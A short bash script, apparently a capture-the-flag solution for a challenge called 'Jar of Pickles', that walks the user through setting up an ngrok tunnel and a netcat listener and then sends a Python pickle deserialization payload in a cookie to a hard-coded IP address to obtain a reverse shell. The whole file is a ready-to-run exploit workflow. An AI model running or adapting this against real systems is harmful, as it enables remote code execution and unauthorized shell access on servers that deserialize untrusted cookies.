#!/bin/bash

URL=http://141.85.224.105:8007/

# Jar of Pickles
echo "Step 1: Forward your 1234 port using ngrok."
echo "Use the instructions from here: https://securiumsolutions.com/blog/reverse-shell-using-tcp/"
echo "Press any key to continue if you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Step 2: Update the ngrok IP and PORT in \`./payload.py\` so that it could connect to it."
echo "Press any key to continue if you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Step 3: In a new terminal, open a new connection to your internal port: \`nc -nvlk 1234\`"
echo "Press any key when you did, to continue"
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done


echo "Now I am sending the reverse shell payload, check the \`nc\` terminal..."
cookie_payload=`python3 ./payload.py`
curl "$URL"'/jar' -H "Cookie: pickles=$cookie_payload"
